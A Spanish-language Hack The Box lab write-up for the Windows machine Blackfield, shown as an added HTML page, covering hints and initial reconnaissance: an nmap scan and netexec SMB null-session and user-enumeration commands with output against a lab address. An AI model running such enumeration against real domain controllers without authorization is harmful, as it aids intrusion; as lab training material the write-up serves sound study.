@@ -1,0 +1,1498 @@
+<!doctype html>
+<html
+  lang="es"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="es">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>HTB - Blackfield &middot; Fluwhen</title>
+    <meta name="title" content="HTB - Blackfield &middot; Fluwhen">
+  
+
+  
+  
+  
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    <meta name="description" content="Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.">
+  
+  
+    <meta name="keywords" content="HackTheBox,Windows,Active Directory,">
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/writeupps/htb-blackfield/">
+  
+  
+
+  
+  
+    <meta name="author" content="Fluwhen">
+  
+  
+
+  
+  <meta property="og:url" content="//localhost:1313/writeupps/htb-blackfield/">
+	<meta property="og:site_name" content="Fluwhen">
+	<meta property="og:title" content="HTB - Blackfield">
+	<meta property="og:description" content="Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.">
+	<meta property="og:locale" content="es">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="writeupps">
+		<meta property="article:published_time" content="2026-07-28T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-28T00:00:00+00:00">
+		<meta property="article:tag" content="HackTheBox">
+		<meta property="article:tag" content="Windows">
+		<meta property="article:tag" content="Active Directory">
+		<meta property="og:image" content="//localhost:1313/writeupps/htb-blackfield/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="//localhost:1313/writeupps/htb-blackfield/feature.png">
+	<meta name="twitter:title" content="HTB - Blackfield">
+	<meta name="twitter:description" content="Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.08e128dd0b63b89e7bf1fd6ac2206797fd2bbeafd9fc83c4b8defa0185a22f1e69160b0e20baaa5b2a97d4a3e5d6736244dcac839e311058dcc1abcee4ca1150.css"
+    integrity="sha512-COEo3QtjuJ578f1qwiBnl/0rvq/Z/IPEuN76AYWiLx5pFgsOILqqWyqX1KPl1nNiRNysg54xEFjcwavO5MoRUA==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.20c0df9d0135e3169f5efa2324d182120b3c04dc95fa7a0e56ff0dd9bc25f32b13ca5cca43a34b1f323c4eed789f01e3359bcc182c8c5580a4a2eca80cf89ddf.js"
+    integrity="sha512-IMDfnQE14xafXvojJNGCEgs8BNyV&#43;noOVv8N2bwl8ysTylzKQ6NLHzI8Tu14nwHjNZvMGCyMVYCkouyoDPid3w=="></script>
+  
+
+
+  
+  
+  
+  
+  
+    
+    <script
+      type="text/javascript"
+      src="/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js"
+      integrity="sha512-mBTe6WFNMq61YjnRGO3&#43;IKzWIxQk&#43;bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+    
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.fef019b6dbf2c8a5f03bde7b069135c4b35fd364d9960a16c6dfafbfbb52e8364310f4bfc6f2374575c0b6fb476219636a8b887a7a81a242326e7d1d33251be5.js"
+      integrity="sha512-/vAZttvyyKXwO957BpE1xLNf02TZlgoWxt&#43;vv7tS6DZDEPS/xvI3RXXAtvtHYhljaouIenqBokIybn0dMyUb5Q=="
+      data-copy="Copiar"
+      data-copied="Copiado"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "writeupps",
+    "name": "HTB - Blackfield",
+    "headline": "HTB - Blackfield",
+    
+    "inLanguage": "es",
+    "url" : "//localhost:1313/writeupps/htb-blackfield/",
+    "author" : {
+      "@type": "Person",
+      "name": "Fluwhen",
+      "image": "//localhost:1313/img/profile-city-pop-cat-glasses.png"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-07-28T00:00:00\u002b00:00",
+    "datePublished": "2026-07-28T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-07-28T00:00:00\u002b00:00",
+    
+    "keywords": ["HackTheBox","Windows","Active Directory"],
+    
+    "mainEntityOfPage": "//localhost:1313/writeupps/htb-blackfield/",
+    "wordCount": "1846"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Ir al contenido
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
+  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
+    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Fluwhen
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/writeupps/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="writeupps"
+      title="writeupps">
+      
+      
+        <span class="text-base font-medium break-normal">
+          writeupps
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/writeupps/"
+        aria-label="writeupps"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="writeupps" class="text-2xl font-bold tracking-tight">
+          writeupps
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/writeupps/htb-blackfield/background_hu_a26e9a04e1039002.jpg"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/writeupps/htb-blackfield/background_hu_a26e9a04e1039002.jpg"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >jaaa</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeupps/"
+      >writeupps</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeupps/htb-blackfield/"
+      >HTB - Blackfield</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB - Blackfield
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-07-28T00:00:00&#43;00:00">28 julio 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">9 mins</span><span class="px-2 text-primary-500">&middot;</span><span class="mb-[2px]">
+  <span
+    id="zen-mode-button"
+    class="text-lg hover:text-primary-500"
+    title="Activar modo zen"
+    data-title-i18n-disable="Activar modo zen"
+    data-title-i18n-enable="Desactivar modo zen">
+    <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg></span></span>
+  </span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+      
+        
+      
+        
+          
+            
+              
+            
+            
+              
+                <a class="relative mt-[0.5rem] me-2" href="/tags/hackthebox/">
+                  <span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    HackTheBox
+  </span>
+</span>
+
+                </a>
+              
+            
+          
+            
+              
+            
+            
+              
+                <a class="relative mt-[0.5rem] me-2" href="/tags/windows/">
+                  <span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    Windows
+  </span>
+</span>
+
+                </a>
+              
+            
+          
+            
+              
+            
+            
+              
+                <a class="relative mt-[0.5rem] me-2" href="/tags/active-directory/">
+                  <span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    Active Directory
+  </span>
+</span>
+
+                </a>
+              
+            
+          
+        
+      
+    </div>
+  
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+      
+      
+        
+        
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="Fluwhen"
+        src="/img/profile-city-pop-cat-glasses_hu_b9253b281775cf56.png"
+        data-zoom-src="/img/profile-city-pop-cat-glasses_hu_5bf26a197cb47b9e.png">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Autor
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        Fluwhen
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">Offensive Cibersecurity Research</div>
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#spoiler">Spoiler</a></li>
+    <li><a href="#writeupp">Writeupp</a>
+      <ul>
+        <li><a href="#reconocimiento">Reconocimiento</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#spoiler">Spoiler</a></li>
+    <li><a href="#writeupp">Writeupp</a>
+      <ul>
+        <li><a href="#reconocimiento">Reconocimiento</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+
+
+
+
+  
+  
+
+
+<section class="machine-htb" style="--machine-difficulty: #FF3E3E;">
+  <header class="machine-htb__header">
+    <div>
+      <div class="machine-htb__eyebrow">Información de la máquina</div>
+      <div class="machine-htb__name">Blackfield</div>
+    </div>
+    <div class="machine-htb__platform">Hack The Box</div>
+  </header>
+  <div class="machine-htb__details">
+    <div class="machine-htb__detail">
+      <div class="machine-htb__label">Dirección IP</div>
+      <div class="machine-htb__value machine-htb__value--mono">10.129.229.17</div>
+    </div>
+    <div class="machine-htb__detail">
+      <div class="machine-htb__label">Sistema operativo</div>
+      <div class="machine-htb__value">Windows</div>
+    </div>
+    <div class="machine-htb__detail">
+      <div class="machine-htb__label">Dificultad</div>
+      <div class="machine-htb__value machine-htb__difficulty">● Hard</div>
+    </div>
+  </div>
+</section>
+
+
+<h2 class="relative group">Spoiler
+    <div id="spoiler" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#spoiler" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<hr>
+<p>Esta sección está diseñada por si no quieres leer el writeupp completo y necesitas algunas pistas</p>
+<style>
+  .spoiler-toggle {
+    position: absolute;
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  .spoiler-text {
+    cursor: pointer;
+    filter: blur(6px);
+    opacity: 0.35;
+    transition: filter 0.2s ease, opacity 0.2s ease;
+  }
+
+  .spoiler-toggle:checked + .spoiler-text {
+    filter: none;
+    opacity: 1;
+    user-select: text;
+  }
+</style>
+<p>Hint 1:
+<input class="spoiler-toggle" type="checkbox" id="step-1">
+<label class="spoiler-text" for="step-1">
+Usuarios por defecto, siempre son un defecto para el sistema si los habilitas :c
+</label></p>
+<p>Hint 2:
+<input class="spoiler-toggle" type="checkbox" id="step-2">
+<label class="spoiler-text" for="step-2">
+Bloodhound, no hay nada más que decir
+</label></p>
+<p>Hint 3:
+<input class="spoiler-toggle" type="checkbox" id="step-3">
+<label class="spoiler-text" for="step-3">
+Carpetas compartidas con cosas interesantes, revisarlas no hará daño, solo tomará un sas de tiempo
+</label></p>
+<p>Hint 4:
+<input class="spoiler-toggle" type="checkbox" id="step-4">
+<label class="spoiler-text" for="step-4">
+Si al final no funciona lo común entonces busca una manera alternativa de hacerlo, san google mi pastor
+</label></p>
+
+<h2 class="relative group">Writeupp
+    <div id="writeupp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#writeupp" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<hr>
+
+<h3 class="relative group">Reconocimiento
+    <div id="reconocimiento" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconocimiento" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Comenzamos realizando es el escaneo de puertos y servicios, para ellos nos apoyaremos de nmap por medio del comando:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nmap -sS -Pn -n --min-rate <span class="m">5000</span> -p- 10.129.229.17 -sV</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1030"
+    height="244"
+    src="/writeupps/htb-blackfield/image_hu_72d8e6171c5311cc.png"
+    srcset="/writeupps/htb-blackfield/image_hu_72d8e6171c5311cc.png 800w, /writeupps/htb-blackfield/image.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-blackfield/image.png"></figure>
+<p>En el resultado del escaneo podemos ver diferentes puertos muy típicos en máquins windows (especialmente las de HTB), al no tener tal vez un puerto 21 (FTP) o una web (80 - 443) abierto entonces procederemos a través del protocolo 445 enumerando cosas que nos pueden ser útiles.</p>
+<p>Algo adicional a destacar del escaneo es el dominoi que nos arroja <em>blackfield.local</em>, esto lo pondremos en nuestro archivo de configuración <code>/etc/hosts</code> en conjunto con la ip del servidor para que nuestra máquina sepa a que ip nos referimos al momento de querer interactuar con el dominio <em>vlackfield.local</em></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ cat /etc/hosts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">(</span>...<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># hackthebox</span>
+</span></span><span class="line"><span class="cl">10.129.229.17 blackfield.local</span></span></code></pre></div></div>
+<p>Ahora procederemos a verificar si se puede tener interacción con sesiones nulas</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc smb blackfield.local -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\:</span></span></span></code></pre></div></div>
+<p>Al parecer, todo bien&hellip;, nos dejará enumerar usuarios ?</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ nxc smb blackfield.local -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --users
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.229.17   <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> BLACKFIELD.local<span class="se">\:</span> 
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                   </span></span></code></pre></div></div>
+<p>No parecer ser el caso, sin embargo, hay otra forma en cómo poder descubrir usuarios, a través de su rid el cual se hace con el parámetro <code>--rid-brute</code>, probemos esa teoría</p>
+<div class="admonition relative overflow-hidden rounded-lg border-l-4 my-3 px-4 py-3 shadow-sm" data-type="note">
+      <div class="flex items-center gap-2 font-semibold text-inherit">
+        <div class="flex shrink-0 h-5 w-5 items-center justify-center text-lg"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z"/></svg>
+</span></div>
+        <div class="grow">
+          Note
+        </div>
